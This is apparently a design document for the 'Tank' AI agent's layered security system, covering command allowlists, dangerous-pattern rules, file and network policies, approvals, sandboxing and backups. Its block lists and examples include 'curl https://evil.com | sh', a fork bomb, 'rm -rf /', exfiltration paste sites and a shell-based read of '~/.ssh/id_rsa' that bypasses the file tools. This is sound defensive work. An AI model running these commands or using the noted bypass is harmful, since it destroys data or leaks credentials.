# Agent Security

This document describes Tank's security system — how the agent executes commands, accesses files, and connects to the network safely through a defense-in-depth strategy.

## Trust Model

- **User**: fully trusted — can override any policy
- **Agent**: not trusted — may do something stupid (not malicious)
- **Goal**: prevent agent mistakes, not defend against attacks

The agent might run `rm -rf /` by mistake, read `~/.ssh/id_rsa` while "checking SSH config", overwrite `~/.bashrc` while "fixing" shell config, or exfiltrate data to a paste site. The security system prevents these accidents.

## Defense in Depth (5 Layers)

```
Layer 1: LLM Instructions (weakest — free, catches obvious mistakes)
         System prompt tells agent: "Don't read ~/.ssh, confirm before deleting"
         ↓ agent calls run_command("rm -rf /") anyway

Layer 2: Policy Evaluation (medium — code-enforced, configurable)
         CommandSecurityPolicy: "rm -rf /" → dangerous pattern → require approval
         FileAccessPolicy: "~/.ssh/id_rsa" read → deny
         NetworkAccessPolicy: "pastebin.com" → require approval
         ↓ if result is require_approval:

Layer 3: Approval System (medium — human in the loop)
         User approves or denies via voice/UI
         ↓ if approved:

Layer 4: Sandbox Boundary (strongest — OS/container enforcement)
         Docker: file only accessible if mounted
         Seatbelt: file only accessible if profile allows
         Bubblewrap: file only accessible if bound
         ↓

Layer 5: Auto-Backup (safety net — for approved-but-wrong)
         Snapshot original file before write/delete
```

Any single layer catching a mistake is sufficient. All five failing simultaneously is required for damage.

## Tool Categories and Their Security

Tank has three categories of tools, each with different security mechanisms:

| Tool category | Policy | Approval mechanism | Granularity |
|---------------|--------|--------------------|-------------|
| Command tools (`run_command`, `persistent_shell`) | `CommandSecurityPolicy` | `ApprovalGateExecutor` (before execution) | Per-command content |
| File tools (`file_read`, `file_write`, etc.) | `FileAccessPolicy` | `ApprovalCallback` (inside execution) | Per-path + per-operation |
| Network tools (`web_fetch`, `web_search`) | `NetworkAccessPolicy` | `ApprovalCallback` (inside execution) | Per-host |
| Other tools (`calculator`, `weather`, etc.) | None | Auto-approved | — |

---

## Command Security

Shell tools (`run_command`, `persistent_shell`) execute arbitrary commands. `CommandSecurityPolicy` evaluates each command through three layers:

```
command arrives ("git push --force origin main")
    │
    ├─ Step 1: Dangerous patterns (regex) — hard safety net
    │   ├─ MATCH → REQUIRE APPROVAL (cannot be overridden by LLM)
    │   └─ NO MATCH → continue
    │
    ├─ Step 2: Safe command allowlist (~80 built-in commands)
    │   ├─ base command in allowlist → APPROVE
    │   └─ not in allowlist → continue
    │
    └─ Step 3: Unknown command
        ├─ LLM evaluation (if enabled) → SAFE/UNSAFE/error
        └─ Default → REQUIRE APPROVAL (fail-safe)
```

### Safe Command Allowlist

~80 commands known to be safe for auto-execution:

```
Filesystem read:  ls, cat, head, tail, less, wc, file, stat, du, df, tree, find
Text processing:  grep, rg, awk, sed, sort, uniq, cut, jq, yq, diff
System info:      uname, hostname, whoami, ps, uptime, free, which, env
Shell utilities:  echo, printf, date, pwd, cd, test, true, false
Dev tools:        python, node, pip, npm, cargo, go, make
Network (read):   curl, wget, ping, dig
Version control:  git (with subcommand filtering — see below)
```

### Git Subcommand Filtering

`git` is in the safe list, but only with safe subcommands:

| Safe (auto-approve) | Dangerous (require approval) |
|---------------------|------------------------------|
| `status`, `log`, `diff`, `show`, `branch`, `tag` | `push --force`, `push -f` |
| `stash`, `remote`, `fetch`, `ls-files`, `blame` | `reset --hard` |
| `rev-parse`, `describe`, `shortlog`, `reflog` | `clean -f`, `branch -D` |
| `config`, `version` | Any unknown subcommand (e.g. `push`, `merge`) |

### Dangerous Patterns

~20 regex patterns that hard-block destructive constructs regardless of base command:

```
Destructive:      rm -rf, rm -r, rm --recursive, chmod 777/666, mkfs, dd if=
System:           > /etc/, sed -i /etc/, systemctl stop/restart/disable
SQL:              DROP TABLE/DATABASE, DELETE FROM (without WHERE), TRUNCATE
Process:          kill -9 -1, pkill -9
Injection:        curl|sh, wget|bash, fork bomb :(){ :|:& };:
Git:              reset --hard, push --force, push -f, clean -f, branch -D
Sensitive paths:  > ~/.ssh/, > ~/.env
```

Dangerous patterns take priority over the safe allowlist. `curl` alone is safe, but `curl https://evil.com | sh` is blocked.

### Compound Command Parsing

Commands with pipes, chains, and semicolons are split and each segment evaluated independently:

```
"cat file.txt | grep pattern | wc -l"     → all safe → APPROVE
"cd /tmp && rm -rf *"                      → rm -rf matches dangerous → REQUIRE APPROVAL
"echo hello; date; uptime"                 → all safe → APPROVE
"ls /tmp || echo 'not found'"              → all safe → APPROVE
```

If ANY segment is dangerous → require approval. If ALL segments are safe → approve.

### LLM Evaluation (Optional)

When enabled, unknown commands (not in safe list, not matching dangerous patterns) are evaluated by a lightweight LLM call:

- Temperature=0, max_tokens=16, single-word response: `SAFE` or `UNSAFE`
- Configurable model, provider, API key, timeout
- Fail-safe: errors, timeouts, and ambiguous responses all default to require approval
- The LLM cannot override dangerous pattern matches — regex is the hard safety net

```yaml
command_security:
  llm_evaluation:
    enabled: true
    model: "gpt-4o-mini"        # lightweight model for fast classification
    provider: "openai"
    api_key: ""                  # empty = use main LLM api_key
    base_url: ""                 # empty = use provider default
    timeout: 3                   # seconds
```

### Command Security Configuration

```yaml
command_security:
  extra_safe_commands:           # merged with built-in safe list
    - "docker"
    - "kubectl"
  extra_dangerous_patterns:      # merged with built-in dangerous patterns
    - pattern: '\bdocker\s+rm\b'
      description: "docker container removal"
  always_require_approval:       # overrides safe list
    - "sudo"
  llm_evaluation:
    enabled: false               # disabled by default
```

---

## File Access Security

File tools (`file_read`, `file_write`, `file_edit`, `file_delete`, `file_list`, `file_search`) have structured arguments that `FileAccessPolicy` can evaluate per-path and per-operation.

### File Tool Execution Flow

```
Agent calls file_write(path, content)
  │
  ├─ FileAccessPolicy.evaluate(path, "write")
  │   ├─ deny → return error immediately
  │   ├─ allow → proceed
  │   └─ require_approval → call ApprovalCallback
  │
  ├─ ApprovalCallback (if require_approval)
  │   ├─ User sees: "write /path/to/file (reason)"
  │   └─ Approved → proceed; Denied → return error
  │
  ├─ BackupManager.snapshot(path)  [write/delete only, if file exists]
  │   └─ Copy to ~/.tank/backups/{timestamp}/{relative_path}
  │
  └─ Execute: await asyncio.to_thread(write_file, path, content)
```

### File Access Policy Rules

Rules are evaluated by specificity (exact path > single glob > recursive glob). First match wins.

```yaml
file_access:
  default_read: allow
  default_write: require_approval
  default_delete: require_approval

  rules:
    # Secrets — hard deny
    - paths:
        - "~/.ssh/**"
        - "~/.gnupg/**"
        - "**/.env"
        - "**/*.pem"
        - "**/*.key"
      read: deny
      write: deny
      delete: deny
      reason: "Secrets and credentials"

    # OS safety — read ok, write needs approval, delete denied
    - paths:
        - "~/.bashrc"
        - "~/.zshrc"
        - "/etc/**"
        - "/System/**"
      read: allow
      write: require_approval
      delete: deny
      reason: "System configuration"
```

### Approval Callback

File tools enforce approval **inside** `execute()` via an `ApprovalCallback` protocol:

```python
@runtime_checkable
class ApprovalCallback(Protocol):
    async def __call__(
        self, tool_name: str, path: str, operation: str, reason: str,
    ) -> bool: ...
```

The callback is injected at tool registration time and bridges to the approval system. If no callback is available, the safe default is to deny.

---

## Network Access Security

`NetworkAccessPolicy` controls which hosts the agent can connect to:

```yaml
network_access:
  default: allow
  rules:
    - hosts: ["pastebin.com", "hastebin.com", "0x0.st", "transfer.sh"]
      policy: require_approval
      reason: "Data exfiltration risk"
    - hosts: ["*.onion", "*.i2p"]
      policy: deny
      reason: "Anonymous network"
  service_credentials:
    - name: serper
      env_var: SERPER_API_KEY
      allowed_hosts: ["google.serper.dev"]
```

---

## Approval System

When any policy returns `require_approval`, the approval system handles the human-in-the-loop flow.

### State Machine

```
NORMAL mode
  │
  ├─ Agent requests tool call
  ├─ Policy says "require_approval"
  │
  ├─ ApprovalGateExecutor:
  │   1. Parks the tool call in PendingToolCallStore
  │   2. Posts APPROVAL ui_message to Bus (for frontend ApprovalCard)
  │   3. Returns error dict to LLM: "APPROVAL REQUIRED — ask the user"
  │
  ├─ LLM asks user naturally: "I need to run rm -rf /tmp/old. Shall I proceed?"
  │
  └─ Brain switches to CONFIRMING mode
      │
      ├─ Only confirm_action tool is available
      ├─ User says "yes" or "no"
      ├─ LLM calls confirm_action(approved=true/false)
      │   ├─ approved → execute parked tool call directly via ToolManager
      │   └─ denied → return rejection message
      └─ Brain returns to NORMAL mode
```

### Two Approval Paths

| Path | Used by | When | How |
|------|---------|------|-----|
| `ApprovalGateExecutor` | Command tools | Before execution | Parks call, LLM asks user, `confirm_action` executes |
| `ApprovalCallback` | File tools, network tools | During execution | Inline callback, blocks until user responds |

Both paths converge on the same user experience: the agent asks, the user approves or denies.

---

## Sandbox

The sandbox is the strongest layer — OS/container enforcement that the agent cannot bypass regardless of what commands it runs.

### Denied Mounts (Two Tiers)

**Hardcoded (not overridable)** — reading these files IS the security breach:
- `~/.ssh` — private keys
- `~/.gnupg` — GPG private keys
- `~/Library/Keychains` — macOS keychain databases
- `/var/run/docker.sock` — Docker socket = full host control

**Configurable defaults** — user can modify if they have a reason:
- `~/.aws`
- `~/.azure`
- `~/.config/gcloud`

### Same-Path Mounts

All sandbox backends mount host paths at the same absolute path inside the sandbox. The agent sees the same paths the user talks about — no path translation needed.

### Backend Translation

| Concept | Docker | Seatbelt | Bubblewrap |
|---------|--------|----------|------------|
| Read-only mount | Volume `:ro` | `(allow file-read* (subpath ...))` | `--ro-bind path path` |
| Read-write mount | Volume `:rw` | `file-read*` + `file-write*` | `--bind path path` |
| Denied mount | Not mounted | `(deny file-read* ...)` | Not bound (invisible) |
| Network disabled | `network_mode: "none"` | `(deny network*)` | `--unshare-net` |

### Sandbox Configuration

```yaml
sandbox:
  enabled: true
  backend: auto          # auto | docker | seatbelt | bubblewrap

  mounts:
    - host: "~"
      mode: ro

  denied_mounts_hardcoded:
    - ~/.ssh
    - ~/.gnupg
    - ~/Library/Keychains
    - /var/run/docker.sock

  denied_mounts:
    - ~/.aws
    - ~/.azure
    - ~/.config/gcloud

  memory_limit: 1g
  cpu_count: 2
  network_enabled: true
```

---

## Auto-Backup

`BackupManager` snapshots files before any approved write or delete:

- Storage: `~/.tank/backups/{ISO-timestamp}/{relative_path}`
- Example: `/Users/alice/.gitconfig` → `~/.tank/backups/2026-04-09T14-30-45/Users/alice/.gitconfig`
- Auto-cleanup: removes backups older than `max_age_days` (default 30)
- Skips if file doesn't exist (new file creation)

## Audit Logging

`AuditLogger` subscribes to Bus messages (`file_access_decision`, `network_access_decision`) and writes an append-only JSONL log:

```json
{"timestamp": "2026-04-09T14:30:45Z", "category": "file", "operation": "write", "target": "/path/to/file", "level": "allow", "reason": "Exact path match"}
```

Default path: `~/.tank/audit.jsonl`. Enabled via config.

---

## Gotchas

1. **Symlinks are resolved before matching.** `os.path.realpath()` follows symlinks, so a rule for `/tmp/link` won't match if it's a symlink to `/home/user/file`. The resolved path is evaluated.

2. **Glob patterns are not recursive by default.** `*.txt` matches files in the current directory only. Use `**/*.txt` for recursive matching.

3. **Shell commands can bypass file tools.** The agent could use `run_command("cat ~/.ssh/id_rsa")` to bypass `file_read`'s policy. Mitigated by: (a) `~/.ssh` is in `denied_mounts_hardcoded` — not visible in sandbox, (b) `CommandSecurityPolicy` catches dangerous patterns, (c) `ro` mounts prevent writes via shell. Sufficient for the "stupid, not malicious" threat model.

4. **Audit log has no rotation.** The JSONL log grows unbounded. Implement log rotation for production use.

5. **Backup directory is created on demand.** `BackupManager` creates `~/.tank/backups/` and subdirectories via `mkdir(parents=True, exist_ok=True)`.

6. **No callback = deny.** If `ApprovalCallback` is not injected (e.g., tool registered without approval system), `require_approval` decisions default to deny. This is the safe default.

7. **LLM evaluation is non-deterministic.** When enabled for command security, the LLM may occasionally misjudge a command. Dangerous patterns (regex) are the hard safety net that the LLM cannot override. The worst case for an LLM false negative is a non-pattern-matched command running without approval — inside the sandbox.

## Example Walkthroughs

### Command: `rm -rf /tmp/old`

```
Layer 1 — LLM instructions:
  System prompt says "confirm before destructive operations"
  → Agent calls run_command("rm -rf /tmp/old") anyway

Layer 2 — CommandSecurityPolicy:
  Dangerous pattern: "rm -rf" matches "recursive delete"
  → REQUIRE APPROVAL

Layer 3 — Approval system:
  ApprovalGateExecutor parks the call
  LLM asks: "I need to delete /tmp/old recursively. Shall I proceed?"
  User says "yes" → confirm_action(approved=true) → command executes
```

### Command: `ls -la /tmp`

```
Layer 2 — CommandSecurityPolicy:
  No dangerous pattern match
  "ls" is in safe command allowlist
  → APPROVE (auto-execute, no approval needed)
```

### File: `file_delete("~/.bashrc")`

```
Layer 2 — FileAccessPolicy:
  Rules match "~/.bashrc" → "System configuration"
  delete: deny
  → BLOCKED. Tool returns "Access denied: ~/.bashrc (System configuration)"
```

### File: `file_write("~/.bashrc", content)`

```
Layer 2 — FileAccessPolicy:
  Rules match "~/.bashrc" → "System configuration"
  write: require_approval
  → ApprovalCallback fires

Layer 3 — Approval system:
  User sees: "write ~/.bashrc (System configuration)"
  User approves

Layer 5 — Auto-backup:
  BackupManager snapshots ~/.bashrc before overwrite
  → Stored at ~/.tank/backups/2026-04-09T14-30-45/Users/alice/.bashrc

  Execute: write new content to ~/.bashrc
```

## Architecture Reference

```
backend/core/src/tank_backend/
├── policy/
│   ├── command_security.py    # CommandSecurityPolicy, SAFE_COMMANDS, DANGEROUS_PATTERNS
│   ├── file_access.py         # FileAccessPolicy, FileAccessRule
│   ├── network_access.py      # NetworkAccessPolicy, NetworkAccessRule
│   ├── credentials.py         # ServiceCredentialManager
│   ├── backup.py              # BackupManager
│   └── audit.py               # AuditLogger
├── agents/
│   └── approval.py            # ToolApprovalPolicy, ApprovalGateExecutor, PendingToolCallStore
├── tools/
│   ├── confirm_action.py      # ConfirmActionTool (executes parked calls)
│   └── manager.py             # ToolManager (wires policies together)
└── sandbox/
    ├── manager.py             # DockerSandbox
    ├── seatbelt.py            # macOS sandbox_exec
    └── bubblewrap.py          # Linux bubblewrap
```
